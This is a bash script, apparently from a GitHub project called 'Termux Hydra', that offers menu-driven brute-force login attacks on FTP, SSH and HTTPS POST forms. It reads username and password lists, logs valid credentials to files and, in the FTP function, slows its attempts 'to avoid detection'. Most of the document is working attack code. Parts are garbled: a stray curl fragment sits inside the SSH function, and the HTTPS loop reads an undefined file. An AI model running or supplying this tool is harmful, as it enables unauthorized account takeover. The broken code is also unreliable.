#!/bin/bash

# Function to clear the screen
clear_screen() {
    clear
}
# Function to display the green-colored banner
display_banner() {
    echo -e "\e[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⢸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣦⣤⣀⣀⣤⣤⣀⡀⠀⣀⣠⡆⠀⠀⠀⠀⠀⠀⠤⠒⠛⣛⣛⣻⣿⣶⣾⣿⣦⣄⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠸⠿⢿⣿⣿⣿⣯⣭⣿⣿⣿⣿⣋⣀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣓⠢⠄⢠⡾⢻⣿⣿⣿⣿⡟⠁⠀⠀⠈⠙⢿⣿⣿⣯⡻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠙⢿⣿⣿⣿⣷⣄⠁⠀⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣷⣌⢧⠀⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⢀⠉⠙⠛⠛⠿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡀⠠⢻⡟⢿⣿⣿⣿⣿⣧⣄⣀⠀⠘⢶⣄⣀⠀⠀⠈⢻⠿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣾⠀⠀⠀⠻⣈⣙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠲⣄⠀⠀⣀⡤⠤⠀⠀⠀⢠⣿⣿⣿⡿⣿⠇⠀⠀⠐⠺⢉⣡⣴⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣶⣿⣿⣿⣶⣶⡀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣴⣿⣷⣶⣦⣤⡀⠀⢸⣿⣿⣿⠇⠏⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣷⠀⠹⣿⣿⠿⠿⠛⠻⠿⣿⠇⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣷⣯⡂⢸⣿⣿⣿⠀⠀⠀⠀⢀⠾⣻⣿⣿⣿⠟⠀⠀⠈⣿⣿⣿⣿⡇⠀⠀⣀⣀⡀⠀⢠⡞⠉⠀⠀⠀⠀
⠀⠀⢸⣟⣽⣿⣯⠀⠀⢹⣿⣿⣿⡟⠼⣿⣿⣿⣇⠀⠀⠀⠠⢰⣿⣿⣿⣿⡄⠀⠀⠀⣸⣿⣿⣿⡇⠀⢀⣤⣼⣿⣷⣾⣷⡀⠀⠀⠀⠀
⠀⢀⣾⣿⡿⠟⠋⠀⠀⢸⣿⣿⣿⣿⡀⢿⣿⣿⣿⣦⠀⠀⠀⢺⣿⣿⣿⣿⣿⣄⠀⠀⣿⣿⣿⣿⡇⠐⣿⣿⣿⣿⠿⣿⣿⡿⣦⠀⠀⠀
⠀⢻⣿⠏⠀⠀⠀⠀⢠⣿⣿⣿⡟⡿⠀⠀⢻⣿⣿⣿⣷⣤⡀⠘⣷⠻⣿⣿⣿⣿⣷⣼⣿⣿⣿⣿⣇⣾⣿⣿⣿⠁⠀⢼⣿⣿⣿⣆⠀⠀
⠀⠀⠈⠀⠀⠀⠀⠀⢸⣿⣿⣿⡗⠁⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣾⣆⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠌⣾⣿⣿⣿⣆⠀⠀⠀⠉⠻⣿⡷⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠘⣟⣿⣿⣿⡆⠀⠀⠀⠀⠙⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣶⣤⣤⣤⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⢈⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣠⣤⣤⣶⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣠⣤⣄⠀⠠⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣀⠀⣠⣀⡠⠞⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⣷⣦⣄⣀⢿⡽⢻⣦
⠻⠶⠾⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠋

▀█▀ █▀▀ █▀█ █▀▄▀█ █░█ ▀▄▀   █░█ █▄█ █▀▄ █▀█ ▄▀█
░█░ ██▄ █▀▄ █░▀░█ █▄█ █░█   █▀█ ░█░ █▄▀ █▀▄ █▀█

         Created By : iamunixtz On Github

\e[0m"
}
# Function for FTP attack
ftp_attack() {
    clear_screen
    display_banner
    echo "FTP HYDRA Attack🐉🐉"
    echo ""
    read -p "Enter Target IP: " target_ip
   
    read -p "Enter FTP Port : " ftp_port
   
    read -p "Enter Username / UsernameFile: " username_input
   
    read -p "Enter Password or PassFile: " password_input

    usernames=()
    passwords=()

    if [[ -f $username_input ]]; then
        # Read usernames from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'usernames=($(cat "$username_input"))'
    else
        usernames+=($username_input)
    fi

    if [[ -f $password_input ]]; then
        # Read passwords from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$password_input"))'
    else
        passwords+=($password_input)
    fi

    # Create a file to save successful logins
    success_file="ftp_success_log.txt"
    touch $success_file

    # Attempting FTP login with each combination
    for user in "${usernames[@]}"; do
        for pass in "${passwords[@]}"; do
            echo "Trying FTP login - User: $user, Password: $pass"
            ftp_command="ftp -n $target_ip $ftp_port"
            ftp_attempt="user $user $pass\nquit"
            echo -e $ftp_attempt | eval $ftp_command > /dev/null 2>&1

            if [ $? -eq 0 ]; then
                echo "FTP Login Successful - User: $user, Password: $pass" >> $success_file
                break
            else
                echo "FTP Login Failed - User: $user, Password: $pass"
            fi

            # Introduce a delay between attempts to avoid detection
            sleep 1
        done
    done

    echo "FTP Brute Force Attack Completed."
    read -n 1 -s -r -p "Press Hydra Enter 🐉"
}

#Function for ssh
ssh_attack() {
    clear_screen
    display_banner
    echo "SSH HYDRA  ATTACK 🐉🐲"
    echo ""
    read -p "Enter Target IP: " target_ip

    read -p "Enter SSH Port : " ssh_port

    read -p "Enter Username / UsernameFile: " username_input

    read -p "Enter Password or PassFile: " password_input

    read -p "If you want to test for passwords (s)ame as login, (n)ull, or (r)everse login, enter these letters without spaces (e.g. 'sr') or leave empty otherwise: " extra_options

    usernames=()
    passwords=()

    if [[ -f $username_input ]]; then
        # Read usernames from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'usernames=($(cat "$username_input"))'
    else
        usernames+=($username_input)
    fi

    if [[ -f $password_input ]]; then
        # Read passwords from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$password_input"))'
    else
        passwords+=($password_input)
    fi

    success_file="successlog.txt"
    touch $success_file

    for user in "${usernames[@]}"; do
        for pass in "${passwords[@]}"; do
            ssh_command="sshpass -p '$pass' ssh -o StrictHostKeyChecking=no -p $ssh_port $user@$target_ip"

            if [[ ! -z $username ]]; then
        curl_command+=" -u $username:$password"
    fi

    curl_command+=" $target_url"

            echo "Hydra Start The attack 🐉"
            ssh_command_attempted=$(echo "$ssh_command" | sed "s/\$pass_placeholder/$pass/g")
            eval $ssh_command_attempted

            if [ $? -eq 0 ]; then
                echo -e "\e[32mAttack Success: Valid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
                echo "IP: $target_ip, Username: $user, Password: $pass" >> $success_file
                sleep 2
                read -p "Do you want to exit or continue attacking? [E/C]: " exit_option
                if [ "$exit_option" == "E" ] || [ "$exit_option" == "e" ]; then
                    echo "Exiting Hydra Thanks🐉 "
                    return
                fi
            else
                echo -e "\e[31mHydra Attack Failed: Invalid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
            fi
        done
    done
}
# Function for HTTPS POST login attack
https_post_login_attack() {
    clear_screen
    display_banner
    echo "HTTPS POST Login HYDRA ATTACK 🐉🐲"
    echo ""
    read -p "Enter Target URL: " target_url
    read -p "Enter POST Data (e.g., 'user=admin&password=^PASS^'): " post_data
    read -p "Enter Username / UsernameFile: " username_input
    read -p "Enter Password or PassFile: " password_input
    read -p "Specify the placeholder for password in POST data (e.g., '^PASS^'): " pass_placeholder

    usernames=()
    passwords=()

    if [[ -f $username_input ]]; then
        # Read usernames from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'usernames=($(cat "$username_input"))'
        username=${usernames[0]}
    else
        username=$username_input
    fi

    if [[ -f $password_input ]]; then
        # Read passwords from file
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$password_input"))'
    else
        passwords+=($password_input)
    fi

    # Constructing the curl command
    curl_command="curl -k -X POST -d '$post_data' -H 'Content-Type: application/x-www-form-urlencoded'"

    if [[ ! -z $username ]]; then
        curl_command+=" -u $username:$password"
    fi

    curl_command+=" $target_url"

    echo ""
    read -p "Starting the Attack [Y/N]: " choice
    if [[ $choice == "Y" || $choice == "y" ]]; then
        # Start the attack
        echo "Hydra 🐲 Start Attack"

        while read -r pass; do
            attack_command=$(echo "$curl_command" | sed "s/$pass_placeholder/$pass/g")
            eval $attack_command

            if [ $? -eq 0 ]; then
                echo "Attack Success: Valid credentials - Username: $username, Password: $pass"
                break
            else
                echo "Attack Failed: Invalid credentials - Username: $username, Password: $pass"
            fi
        done < "$password"
    else
        echo "Attack Cancelled."
    fi
    read -n 1 -s -r -p "Press Enter To Continue🐉"
}

# Main Program
while true; do
    clear_screen
    display_banner
    echo "TERMUX HYDRA MENU 🐲🐉:"

    echo "1. FTP Attack"

    echo "2. SSH Attack"

    echo "3. HTTPS POST Login Attack"

    echo "4. Report Bug"

    echo "5. Tool Details"

    echo "6. Exit"

    read -p "=============>> : " option

    case $option in
        1) ftp_attack;;
        2) ssh_attack;;
        3) https_post_login_attack;;
        4) 
            clear_screen
            display_banner
            echo "Hydra 🐉 User If u Found AnyBug Please Kind Report on Github As Issues Thanks."
            echo "[00] Back to Main Menu"
            read -p "Enter Option: " bug_option
            if [[ $bug_option == "00" ]]; then
                continue
            fi
            ;;
        5) 
            clear_screen
            display_banner
            echo "This Inspired By Hydra so We Moded It In Small Hydra ToolKit FoR Termux Users Thanks"
            echo "[00] Back to Main Menu"
            read -p "Enter Option: " details_option
            if [[ $details_option == "00" ]]; then
                continue
            fi
            ;;
        6) exit;;
        *) echo "Hydra Invalid Option 🐲🐉.";;
    esac
done

